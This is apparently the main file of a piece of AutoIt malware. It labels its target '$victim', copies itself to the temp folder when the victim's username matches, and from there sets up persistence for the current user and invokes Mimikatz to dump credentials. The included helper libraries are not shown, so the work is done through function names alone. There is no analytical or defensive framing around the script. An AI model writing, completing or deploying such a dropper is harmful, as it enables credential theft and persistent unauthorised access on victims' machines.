#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "test"

if isRunningFromTemp() Then

   SetPersistent4CurrentUser()

   Mimikatz()

Else

   if AmIusername($victim) Then

	  CopyTempRun()

   EndIf

EndIf